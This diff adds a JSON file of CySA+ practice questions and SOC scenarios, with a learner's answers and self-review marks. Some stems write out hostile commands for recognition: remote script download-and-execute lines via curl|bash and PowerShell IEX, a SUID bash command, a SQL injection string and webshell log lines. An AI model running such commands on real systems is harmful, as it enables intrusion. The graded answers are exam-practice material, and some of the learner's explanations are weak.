@@ -1,0 +1,564 @@
+{
+  "id": "003",
+  "title": "Advanced CySA+ Practice Set",
+  "date": "2026-05-20",
+  "status": "Raw Answers",
+  "summary": "20 advanced CySA+ practice questions and 5 SOC scenarios focused on Linux execution, cloud identity, business email compromise, web application compromise, persistence, forensic handling, and SOC operations.",
+  "questions": [
+    {
+      "id": 1,
+      "topic": "Linux / Script Execution",
+      "status": "Raw Answer",
+      "question": "A security analyst observes the following command executed on a Linux host:\n\n```bash\ncurl -fsSL http://198.51.100.7/install.sh | bash\n```\n\nWhich of the following MOST likely describes the risk?",
+      "options": [
+        "Privilege escalation through Kerberos",
+        "Remote script execution from untrusted source",
+        "DNS cache poisoning",
+        "SSL certificate pinning"
+      ],
+      "myAnswer": "B, suspicious IP, \"install.sh\" file name, bash execution",
+      "review": "correct"
+    },
+    {
+      "id": 2,
+      "topic": "Business Email Compromise",
+      "status": "Raw Answer",
+      "question": "A SIEM correlates the following events:\n\n* Multiple 4625 failed logons\n* Successful VPN authentication\n* Creation of new mailbox forwarding rule\n\nWhich of the following MOST likely occurred?",
+      "options": [
+        "Password spraying followed by business email compromise",
+        "SQL injection",
+        "Rogue DHCP activity",
+        "ARP spoofing"
+      ],
+      "myAnswer": "A, because of multiple failed logins, vpn auth, and creation of new mailbox forwarding rule",
+      "review": "correct"
+    },
+    {
+      "id": 3,
+      "topic": "Vulnerability Prioritization",
+      "status": "Raw Answer",
+      "question": "An organization stores highly confidential research data. According to company policy, confidentiality takes priority over availability.\n\nWhich vulnerability should be remediated FIRST?",
+      "options": [
+        "Public-facing server vulnerable to denial-of-service",
+        "Internal file server vulnerable to information disclosure",
+        "Internal printer vulnerable to remote reboot",
+        "Public-facing system vulnerable to temporary slowdown"
+      ],
+      "myAnswer": "B, because confidentiality is most important, so information disclosure should be minimized",
+      "review": "correct"
+    },
+    {
+      "id": 4,
+      "topic": "On-Path Attacks",
+      "status": "Raw Answer",
+      "question": "An analyst discovers users are intermittently redirected from HTTPS to HTTP while accessing an internal portal.\n\nWhich of the following MOST likely explains this behavior?",
+      "options": [
+        "SSL stripping/on-path attack",
+        "VLAN segmentation failure",
+        "DNS zone transfer",
+        "RAID controller failure"
+      ],
+      "myAnswer": "A, because it's HTTP downgrade attack, mitm",
+      "review": "correct"
+    },
+    {
+      "id": 5,
+      "topic": "Business Continuity",
+      "status": "Raw Answer",
+      "question": "Which of the following BEST ensures critical business functions continue operating during a cyberattack?",
+      "options": [
+        "Disaster recovery plan",
+        "Business continuity plan",
+        "Vulnerability management plan",
+        "Acceptable use policy"
+      ],
+      "myAnswer": "B, because continuity plan is about business surviving and living during some incident",
+      "review": "correct"
+    },
+    {
+      "id": 6,
+      "topic": "Cloud Security / CASB",
+      "status": "Raw Answer",
+      "question": "A company wants visibility and policy enforcement for unsanctioned cloud applications used by employees.\n\nWhich solution BEST addresses this requirement?",
+      "options": [
+        "CASB",
+        "IDS",
+        "SIEM",
+        "Load balancer"
+      ],
+      "myAnswer": "A, because CASB is cloud access security broker, which controls access to cloud from other people",
+      "review": "correct"
+    },
+    {
+      "id": 7,
+      "topic": "PowerShell",
+      "status": "Raw Answer",
+      "question": "A PowerShell script contains the following:\n\n```powershell\nIEX(New-Object Net.WebClient).DownloadString('http://203.0.113.10/payload.ps1')\n```\n\nWhat is the MOST likely purpose of this command?",
+      "options": [
+        "DNS resolution",
+        "Download and execute remote payload",
+        "Memory defragmentation",
+        "SSL certificate renewal"
+      ],
+      "myAnswer": "B",
+      "review": "correct"
+    },
+    {
+      "id": 8,
+      "topic": "LOLBins",
+      "status": "Raw Answer",
+      "question": "An analyst receives the following EDR alert:\n\n```text\nParent Process: winword.exe\nChild Process: rundll32.exe\n```\n\nWhy is this activity suspicious?",
+      "options": [
+        "Word documents normally launch rundll32.exe during updates",
+        "Office applications spawning LOLBins may indicate malware execution",
+        "rundll32.exe is not a Windows binary",
+        "Word automatically performs vulnerability scans"
+      ],
+      "myAnswer": "B, because its not a common event, and its common in living of land attacks",
+      "review": "correct"
+    },
+    {
+      "id": 9,
+      "topic": "Persistence",
+      "status": "Raw Answer",
+      "question": "A threat hunter wants to identify malicious persistence mechanisms on Windows endpoints.\n\nWhich artifact should be reviewed FIRST?",
+      "options": [
+        "Browser cookies",
+        "Registry Run keys and scheduled tasks",
+        "Monitor brightness settings",
+        "Printer spooler queue"
+      ],
+      "myAnswer": "B, because persistence is identified often in registry run keys and scheduled tasks",
+      "review": "correct"
+    },
+    {
+      "id": 10,
+      "topic": "Detection and Response",
+      "status": "Raw Answer",
+      "question": "An organization wants to reduce attacker dwell time.\n\nWhich capability BEST supports this objective?",
+      "options": [
+        "Faster detection and response workflows",
+        "Increased password expiration frequency",
+        "Disabling all outbound traffic",
+        "Weekly software inventory reviews"
+      ],
+      "myAnswer": "A, because in this case attacker will have less time to act",
+      "review": "correct"
+    },
+    {
+      "id": 11,
+      "topic": "DNS Tunneling",
+      "status": "Raw Answer",
+      "question": "A SOC analyst identifies repeated DNS TXT record requests containing Base64-like strings.\n\nWhich technique is MOST likely being used?",
+      "options": [
+        "VLAN hopping",
+        "DNS tunneling",
+        "Pass-the-ticket",
+        "ARP poisoning"
+      ],
+      "myAnswer": "B (but not confident on this one)",
+      "review": "correct"
+    },
+    {
+      "id": 12,
+      "topic": "OAuth Security",
+      "status": "Raw Answer",
+      "question": "An attacker compromises a valid OAuth application and gains persistent access to user mailboxes even after password resets.\n\nWhich control would BEST mitigate this risk?",
+      "options": [
+        "Disable DNSSEC",
+        "Review and restrict OAuth app consent permissions",
+        "Increase password length",
+        "Disable endpoint logging"
+      ],
+      "myAnswer": "B, because restricting OAuth permissions would limit attackers access to mailboxes",
+      "review": "correct"
+    },
+    {
+      "id": 13,
+      "topic": "Forensics / Chain of Custody",
+      "status": "Raw Answer",
+      "question": "A security analyst wants to ensure evidence remains legally admissible during an investigation.\n\nWhich process is MOST important?",
+      "options": [
+        "Chain of custody",
+        "Load balancing",
+        "Vulnerability scanning",
+        "RAID mirroring"
+      ],
+      "myAnswer": "A, because chain of custody is a process to ensure some forensic evidence isn't changed",
+      "review": "correct"
+    },
+    {
+      "id": 14,
+      "topic": "Memory Forensics",
+      "status": "Raw Answer",
+      "question": "A forensic analyst needs to investigate malware that disappears after reboot.\n\nWhich evidence source is MOST valuable?",
+      "options": [
+        "Volatile memory acquisition",
+        "DHCP lease duration",
+        "Browser bookmarks",
+        "SSL certificate transparency logs"
+      ],
+      "myAnswer": "A",
+      "review": "correct"
+    },
+    {
+      "id": 15,
+      "topic": "Alert Accuracy",
+      "status": "Raw Answer",
+      "question": "Which of the following BEST describes a false negative?",
+      "options": [
+        "Benign activity incorrectly flagged as malicious",
+        "Malicious activity incorrectly classified as benign",
+        "Duplicate SIEM event",
+        "Threat feed outage"
+      ],
+      "myAnswer": "B",
+      "review": "correct"
+    },
+    {
+      "id": 16,
+      "topic": "Threat Hunting",
+      "status": "Raw Answer",
+      "question": "A company wants to proactively search for attacker activity that has bypassed automated detections.\n\nWhich activity BEST fits this goal?",
+      "options": [
+        "Threat hunting",
+        "Disaster recovery testing",
+        "Password rotation",
+        "Software procurement review"
+      ],
+      "myAnswer": "C, because rotating password lets analysts detect if there was password leakage and unauthorized access",
+      "review": "incorrect"
+    },
+    {
+      "id": 17,
+      "topic": "Web Application Attacks",
+      "status": "Raw Answer",
+      "question": "A web application firewall blocks repeated requests containing:\n\n```\n' OR 1=1 --\n```\n\nWhich attack was MOST likely attempted?",
+      "options": [
+        "XML injection",
+        "SQL injection",
+        "Kerberoasting",
+        "SSRF"
+      ],
+      "myAnswer": "B",
+      "review": "correct"
+    },
+    {
+      "id": 18,
+      "topic": "Command and Control",
+      "status": "Raw Answer",
+      "question": "An analyst identifies outbound traffic to a domain registered two hours ago.\n\nWhy is this particularly suspicious?",
+      "options": [
+        "Newly registered domains are commonly used in phishing/C2 infrastructure",
+        "DNS only works with older domains",
+        "HTTPS traffic cannot use new domains",
+        "SIEMs automatically block all new domains"
+      ],
+      "myAnswer": "A",
+      "review": "correct"
+    },
+    {
+      "id": 19,
+      "topic": "Linux Privilege Escalation",
+      "status": "Raw Answer",
+      "question": "A Linux administrator discovers:\n\n```bash\nchmod +s /bin/bash\n```\n\nWhy is this concerning?",
+      "options": [
+        "It enables SUID privilege escalation opportunities",
+        "It disables DNS logging",
+        "It resets Linux passwords",
+        "It enables MFA bypass"
+      ],
+      "myAnswer": "A, because chmod means change mod and then bash execution",
+      "review": "correct"
+    },
+    {
+      "id": 20,
+      "topic": "Lateral Movement",
+      "status": "Raw Answer",
+      "question": "Which of the following would MOST likely indicate successful lateral movement?",
+      "options": [
+        "Multiple failed DNS requests",
+        "Remote service creation and SMB admin share access",
+        "Browser cache cleanup",
+        "Local software updates"
+      ],
+      "myAnswer": "B",
+      "review": "correct"
+    }
+  ],
+  "scenarios": [
+    {
+      "id": 1,
+      "title": "MFA Fatigue & Cloud Compromise",
+      "category": "Cloud / Identity",
+      "sections": [
+        {
+          "title": "Azure AD Alerts",
+          "items": [
+            "37 MFA push requests within 12 minutes",
+            "Successful login from unfamiliar ASN",
+            "OAuth consent granted to \"Teams-Backup-Access\""
+          ]
+        },
+        {
+          "title": "Additional Findings",
+          "items": [
+            "User denied initial MFA requests",
+            "Password reset already performed",
+            "Mailbox forwarding rule created"
+          ]
+        }
+      ],
+      "tasks": [
+        "What attack chain MOST likely occurred?",
+        "Why did password reset not fully contain the threat?",
+        "What should analysts revoke FIRST?",
+        "What indicators suggest persistence?",
+        "What controls could reduce similar attacks?"
+      ],
+      "status": "Raw Answer",
+      "myAnswers": [
+        {
+          "answer": "MFA fatigue then data exfil",
+          "review": "partial"
+        },
+        {
+          "answer": "Because attacker already had access to account",
+          "review": "partial"
+        },
+        {
+          "answer": "Freeze/delete mailbox forwarding rule, then immediately lock account or revoke all privileges",
+          "review": "partial"
+        },
+        {
+          "answer": "Attack continuing even after password reset",
+          "review": "partial"
+        },
+        {
+          "answer": "Set limit for max MFA requests, train employees on MFA fatigue attack",
+          "review": "partial"
+        }
+      ]
+    },
+    {
+      "id": 2,
+      "title": "Linux Privilege Escalation",
+      "category": "Linux / Privilege Escalation",
+      "sections": [
+        {
+          "title": "Linux Logs",
+          "items": [
+            "Accepted password for devops from 10.0.5.22",
+            "sudo: devops : COMMAND=/bin/bash",
+            "chmod +s /bin/bash"
+          ]
+        },
+        {
+          "title": "Additional Findings",
+          "items": [
+            "New outbound SSH connections",
+            "Cron job added under /etc/cron.d/",
+            "Large archive created in /tmp/"
+          ]
+        }
+      ],
+      "tasks": [
+        "What attack activity is MOST likely occurring?",
+        "What persistence mechanisms exist?",
+        "What evidence suggests possible exfiltration?",
+        "What should be contained FIRST?",
+        "Which MITRE ATT&CK techniques are likely involved?"
+      ],
+      "status": "Raw Answer",
+      "myAnswers": [
+        {
+          "answer": "Password spraying -> priv esc -> persistence through cron job",
+          "review": "partial"
+        },
+        {
+          "answer": "Cron job, SSH connections",
+          "review": "partial"
+        },
+        {
+          "answer": "SSH connections, archive created in tmp",
+          "review": "correct"
+        },
+        {
+          "answer": "Isolate affected machine from internet to prevent more data exfil",
+          "review": "correct"
+        },
+        {
+          "answer": "T1110.003, T1048.001, T1053.003",
+          "review": "partial"
+        }
+      ]
+    },
+    {
+      "id": 3,
+      "title": "Web Application Breach",
+      "category": "Web Application Compromise",
+      "sections": [
+        {
+          "title": "WAF Logs",
+          "items": [
+            "POST /login",
+            "username=admin' OR 1=1 --"
+          ]
+        },
+        {
+          "title": "Shortly afterward",
+          "items": [
+            "POST /uploads/webshell.php",
+            "cmd.exe /c whoami"
+          ]
+        },
+        {
+          "title": "Additional Findings",
+          "items": [
+            "New local administrator account created",
+            "Outbound HTTPS traffic to VPS provider",
+            "Large outbound encrypted traffic spike"
+          ]
+        }
+      ],
+      "tasks": [
+        "What attack chain MOST likely occurred?",
+        "What evidence indicates persistence?",
+        "What evidence indicates possible data exfiltration?",
+        "What should incident responders isolate FIRST?",
+        "Which MITRE ATT&CK techniques are likely involved?"
+      ],
+      "status": "Raw Answer",
+      "myAnswers": [
+        {
+          "answer": "SQL injection -> webshell malicious file execution",
+          "review": "partial"
+        },
+        {
+          "answer": "HTTPS traffic",
+          "review": "incorrect"
+        },
+        {
+          "answer": "Large traffic spike",
+          "review": "correct"
+        },
+        {
+          "answer": "Affected machines access to internet",
+          "review": "partial"
+        },
+        {
+          "answer": "(skipping for now)",
+          "review": "incorrect"
+        }
+      ]
+    },
+    {
+      "id": 4,
+      "title": "Insider Threat vs Compromised Account",
+      "category": "DLP / Insider Threat",
+      "sections": [
+        {
+          "title": "DLP Alerts",
+          "items": [
+            "18GB of sensitive engineering files downloaded",
+            "Uploads to personal cloud storage",
+            "Activity occurred at 1:17 AM"
+          ]
+        },
+        {
+          "title": "Additional Findings",
+          "items": [
+            "Employee recently submitted resignation",
+            "Access originated from normal VPN location",
+            "UEBA flagged behavior as anomalous",
+            "No malware detected on workstation"
+          ]
+        }
+      ],
+      "tasks": [
+        "What are the TWO most likely explanations?",
+        "What evidence would distinguish insider threat from account compromise?",
+        "What should analysts verify FIRST?",
+        "What containment actions are appropriate?",
+        "How should incident severity be classified?"
+      ],
+      "status": "Raw Answer",
+      "myAnswers": [
+        {
+          "answer": "Its either insider threat or compromised account",
+          "review": "correct"
+        },
+        {
+          "answer": "VPN location, recent resignation submit",
+          "review": "partial"
+        },
+        {
+          "answer": "Persons identity and possible insider threat risk looking at previous incidents",
+          "review": "partial"
+        },
+        {
+          "answer": "Isolating/freezing cloud storage, revoking account privileges",
+          "review": "correct"
+        },
+        {
+          "answer": "Possibly high",
+          "review": "correct"
+        }
+      ]
+    },
+    {
+      "id": 5,
+      "title": "SOC Overload & Missed Intrusion",
+      "category": "SOC Operations",
+      "sections": [
+        {
+          "title": "SOC Metrics",
+          "items": [
+            "22,000 alerts per day",
+            "Analysts manually close most phishing alerts",
+            "Mean time to respond increased 40%",
+            "Several true positives missed during last month"
+          ]
+        },
+        {
+          "title": "Recent Incident",
+          "items": [
+            "Malware beaconed for 9 days before detection",
+            "SIEM generated alerts but analysts ignored them as duplicates",
+            "Analysts report severe burnout"
+          ]
+        }
+      ],
+      "tasks": [
+        "What operational failure MOST likely occurred?",
+        "What SIEM/SOAR improvements would MOST reduce risk?",
+        "What metrics should leadership monitor?",
+        "What risks does alert fatigue create?",
+        "What process changes would MOST improve detection quality?"
+      ],
+      "status": "Raw Answer",
+      "myAnswers": [
+        {
+          "answer": "SIEM misalignment, too much manual work, alert rules not fine tuned",
+          "review": "correct"
+        },
+        {
+          "answer": "fine tuning SIEM",
+          "review": "partial"
+        },
+        {
+          "answer": "Missed true positives, recent incidents and their severity, analysts mental health",
+          "review": "partial"
+        },
+        {
+          "answer": "Burnout and missed positives",
+          "review": "correct"
+        },
+        {
+          "answer": "Specifying and tuning SIEM alert rules, and automating review more",
+          "review": "correct"
+        }
+      ]
+    }
+  ]
+}
